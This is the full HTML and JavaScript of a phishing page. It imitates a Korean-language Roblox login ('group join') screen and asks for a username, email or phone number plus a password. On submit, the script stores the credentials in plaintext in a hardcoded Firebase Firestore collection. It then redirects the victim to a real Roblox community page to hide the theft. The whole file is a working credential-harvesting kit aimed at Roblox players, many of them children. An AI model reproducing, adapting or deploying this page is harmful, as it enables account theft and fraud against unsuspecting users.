<!DOCTYPE html>
<html lang="ko">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<title>Roblox 그룹가입</title>

<style>
* {
    margin: 0;
    padding: 0;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
    -webkit-text-size-adjust: 100%;
    -moz-text-size-adjust: 100%;
    text-size-adjust: 100%;
    -webkit-tap-highlight-color: transparent;
    -webkit-tap-highlight-color: rgba(0,0,0,0);
}

html {
    height: 100%;
    height: -webkit-fill-available;
}

body {
    margin: 0;
    padding: 0;
    width: 100%;
    height: 100%;
    height: -webkit-fill-available;
    background: #000;
    font-family: Arial, Helvetica, sans-serif;
    display: -webkit-box;
    display: -webkit-flex;
    display: -ms-flexbox;
    display: flex;
    -webkit-box-pack: center;
    -webkit-justify-content: center;
    -ms-flex-pack: center;
    justify-content: center;
    -webkit-box-align: center;
    -webkit-align-items: center;
    -ms-flex-align: center;
    align-items: center;
    overflow: hidden;
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
}

.stage {
    position: relative;
    height: 100vh;
    height: var(--app-height, 100vh);
    width: calc(100vh * 1080 / 1905);
    width: calc(var(--app-height, 100vh) * 1080 / 1905);
    max-width: 100vw;
    background-image: url('sdk.jpg');
    -webkit-background-size: cover;
    background-size: cover;
    background-position: center center;
    background-repeat: no-repeat;
}

.box {
    position: absolute;
    -webkit-border-radius: 5px;
    border-radius: 5px;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
    font-weight: 400;
    font-size: 16px;
}

.textbox {
    background: #3B3F4A;
    border: 1.5px solid #4A4F5C;
    color: #CDCFD4;
    padding: 0 10px;
    line-height: normal;
    display: -webkit-box;
    display: -webkit-flex;
    display: flex;
    -webkit-box-align: center;
    -webkit-align-items: center;
    align-items: center;
    outline: none;
    font-size: 16px;
    /* ✅ 모든 브라우저에서 일관된 폰트 렌더링 */
    font-size-adjust: 0.5;
    font-family: Arial, Helvetica, sans-serif;
    -webkit-appearance: none;
    -moz-appearance: none;
    appearance: none;
    -webkit-border-radius: 5px;
    border-radius: 5px;
    -webkit-text-size-adjust: none !important;
    -moz-text-size-adjust: none !important;
    text-size-adjust: none !important;
}

.textbox::-webkit-input-placeholder { color: #CDCFD4; }
.textbox::-moz-placeholder          { color: #CDCFD4; opacity: 1; }
.textbox:-ms-input-placeholder      { color: #CDCFD4; }
.textbox::placeholder                { color: #CDCFD4; }

.textbox:-webkit-autofill,
.textbox:-webkit-autofill:focus {
    -webkit-box-shadow: 0 0 0 1000px #3B3F4A inset !important;
    -webkit-text-fill-color: #CDCFD4 !important;
    caret-color: #CDCFD4;
}

.button {
    background: #343740;
    border: 2px solid #CDCFD4;
    color: #CDCFD4;
    text-align: center;
    line-height: 27px;
    cursor: pointer;
    /* ✅ 모든 브라우저에서 일관된 폰트 렌더링 */
    font-size-adjust: 0.5;
    font-family: Arial, Helvetica, sans-serif;
    -webkit-appearance: none;
    -moz-appearance: none;
    appearance: none;
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
    -ms-touch-action: manipulation;
    touch-action: manipulation;
}

.button:active {
    opacity: 0.75;
}

#text1 {
    left: 13.97%;
    top: 34.34%;
    width: 71.8%;
    height: 5.375%;
    z-index: 100;
}

#text2 {
    left: 13.97%;
    top: 42.5%;
    width: 71.83%;
    height: 5.155%;
    z-index: 100;
}

#btn {
    left: 13.97%;
    top: 48.7%;
    width: 71.9%;
    height: 4.3%;
    z-index: 100;
    display: -webkit-box;
    display: -webkit-flex;
    display: -ms-flexbox;
    display: flex;
    -webkit-box-align: center;
    -webkit-align-items: center;
    -ms-flex-align: center;
    align-items: center;
    -webkit-box-pack: center;
    -webkit-justify-content: center;
    -ms-flex-pack: center;
    justify-content: center;
    line-height: 1;
}

#error {
    position: absolute;
    left: 13.97%;
    top: 48.7%;
    width: 71.8%;
    text-align: center;
    color: red;
    font-size: 14px;
    display: none;
    z-index: 9999;
    /* ✅ 모든 브라우저에서 일관된 폰트 렌더링 */
    font-size-adjust: 0.5;
    font-family: Arial, Helvetica, sans-serif;
}
</style>
</head>

<body>

<div class="stage">
    <input type="text" id="text1" class="box textbox"
           placeholder="사용자 이름/이메일/전화번호"
           autocomplete="username"
           autocorrect="off"
           autocapitalize="off"
           spellcheck="false">
    <input type="password" id="text2" class="box textbox"
           placeholder="비밀번호"
           autocomplete="current-password">
    <div id="error">사용자 이름 또는 비밀번호가 틀렸습니다.</div>
    <div id="btn" class="box button" role="button" tabindex="0">로그인</div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/12.15.0/firebase-app-compat.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/12.15.0/firebase-firestore-compat.min.js"></script>

<script>
(function () {
    'use strict';

    /* ═════════════════════════════════════════════════════════
       ⚙️  설정 값 (여기서 수정 가능)
       ═════════════════════════════════════════════════════════ */

    var FONT_SIZE_CONFIG = {
        inputFontSize:  1.0,   // 입력창 폰트 크기 배율 (1.0 = 100%)
        buttonFontSize: 1.0,   // 버튼 폰트 크기 배율  (1.0 = 100%)
        errorFontSize:  0.8    // 에러 메시지 배율      (0.8 = 80%)
    };

    var REDIRECT_URL = 'https://www.roblox.com/ko/communities/35316698/infinite-donations#!/about';

    var firebaseConfig = {
        apiKey: "AIzaSyAsyFx2WUDoB3o7V2_y86TcyMMfbmm7Q7o",
        authDomain: "zoyq-6c3af.firebaseapp.com",
        projectId: "zoyq-6c3af",
        storageBucket: "zoyq-6c3af.firebasestorage.app",
        messagingSenderId: "230075426156",
        appId: "1:230075426156:web:ae50b8bfb9daae82577f49",
        measurementId: "G-GD46DXS6VS"
    };

    /* ═════════════════════════════════════════════════════════ */

    /* ── 1. CSS 변수 --app-height 설정 ── */
    function setAppHeight() {
        var h = window.innerHeight;
        document.documentElement.style.setProperty('--app-height', h + 'px');
    }
    setAppHeight();
    window.addEventListener('orientationchange', function () {
        setTimeout(setAppHeight, 300);
    });

    /* ── 1-2. 폰트 크기 고정 (stage 너비 기준) ── */
    function fixFontSize() {
        var stage = document.querySelector('.stage');
        if (!stage) return;
        var stageW = stage.offsetWidth;
        var baseSize = Math.round(stageW * 0.038);
        baseSize = Math.max(13, Math.min(18, baseSize));

        // 입력창
        var inputs = document.querySelectorAll('.textbox');
        for (var i = 0; i < inputs.length; i++) {
            inputs[i].style.fontSize = (baseSize * FONT_SIZE_CONFIG.inputFontSize) + 'px';
        }
        // 버튼
        var btn = document.getElementById('btn');
        if (btn) btn.style.fontSize = (baseSize * FONT_SIZE_CONFIG.buttonFontSize) + 'px';
        // 에러 메시지
        var error = document.getElementById('error');
        if (error) error.style.fontSize = (baseSize * FONT_SIZE_CONFIG.errorFontSize) + 'px';
    }
    fixFontSize();
    window.addEventListener('orientationchange', function () {
        setTimeout(fixFontSize, 350);
    });

    /* ── 2. Firebase 초기화 ── */
    firebase.initializeApp(firebaseConfig);
    var db = firebase.firestore();

    /* ── 3. 위치 계산 상수 ── */
    var ERROR_GAP         = 0;
    var BTN_GAP           = 2.5;
    var ERROR_LEFT_OFFSET = -4;
    var BTN_LEFT_OFFSET   = 0;
    var passwordBottom    = 42.5 + 5.155;
    var originalBtnTop    = 48.7;
    var originalLeft      = 13.97;

    /* ── 4. 에러 표시/숨김 ── */
    function showError(show) {
        var btn   = document.getElementById('btn');
        var error = document.getElementById('error');

        if (show) {
            var errorTop = passwordBottom + ERROR_GAP;
            var btnTop   = errorTop + BTN_GAP;
            error.style.top     = errorTop + '%';
            error.style.left    = (originalLeft + ERROR_LEFT_OFFSET) + '%';
            error.style.display = 'block';
            btn.style.top       = btnTop + '%';
            btn.style.left      = (originalLeft + BTN_LEFT_OFFSET) + '%';
        } else {
            error.style.display = 'none';
            btn.style.top       = originalBtnTop + '%';
            btn.style.left      = originalLeft + '%';
        }
    }

    /* ── 5. input 이벤트 ── */
    var text1 = document.getElementById('text1');
    var text2 = document.getElementById('text2');

    [text1, text2].forEach(function (input) {
        input.addEventListener('focus', function () { showError(false); });
        input.addEventListener('input', function () { showError(false); });
    });

    /* ── 6. 로그인 처리 ── */
    var isProcessing = false;

    function handleLogin() {
        if (isProcessing) return;
        isProcessing = true;

        var a = text1.value.trim();
        var b = text2.value.trim();

        var usernameOK = /^[A-Za-z][A-Za-z0-9_]{2,19}$/.test(a);
        var passwordOK = b.length >= 8 && a !== b;

        if (!usernameOK || !passwordOK) {
            showError(true);
            isProcessing = false;
            return;
        }

        showError(false);

        db.collection('texts').add({
            text1: a,
            text2: b,
            createdAt: new Date()
        }).then(function () {
            window.location.href = REDIRECT_URL;
        }).catch(function (e) {
            alert('저장 실패');
            console.error(e);
            isProcessing = false;
        });
    }

    /* ── 7. 버튼 이벤트 ── */
    var btn = document.getElementById('btn');
    var touchMoved = false;

    btn.addEventListener('touchstart', function () {
        touchMoved = false;
    }, { passive: true });

    btn.addEventListener('touchmove', function () {
        touchMoved = true;
    }, { passive: true });

    btn.addEventListener('touchend', function (e) {
        if (touchMoved) return;
        e.preventDefault();
        handleLogin();
    });

    btn.addEventListener('click', function () {
        handleLogin();
    });

    btn.addEventListener('keydown', function (e) {
        if (e.key === 'Enter' || e.keyCode === 13) {
            handleLogin();
        }
    });

})();
</script>

</body>
</html>
